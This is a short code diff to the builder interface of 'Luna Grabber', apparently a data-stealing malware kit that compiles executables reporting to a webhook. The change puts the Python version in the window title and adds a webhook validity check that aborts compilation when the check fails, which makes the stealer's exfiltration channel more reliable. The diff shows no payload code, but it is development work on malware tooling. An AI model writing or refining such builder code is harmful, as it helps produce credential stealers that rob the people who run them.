@@ -25,12 +25,11 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
-
 class App(customtkinter.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("Luna Grabber Builder")
+        self.title(f"Luna Grabber Builder - Running on v{sys.version.split()[0]}")
         self.geometry("1000x550")
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
@@ -462,6 +461,11 @@ class App(customtkinter.CTk):
             logging.error(f"Error with file pumper: {e}")
 
     def compile_file(self, filename, filetype):
+        if not self.verify_webhook():
+            _message = "Webhook not valid. Aborting compilation."
+            logging.error(_message)
+            print(_message)
+            return
         try:
             if self.iconpath is None:
                 exeicon = "NONE"
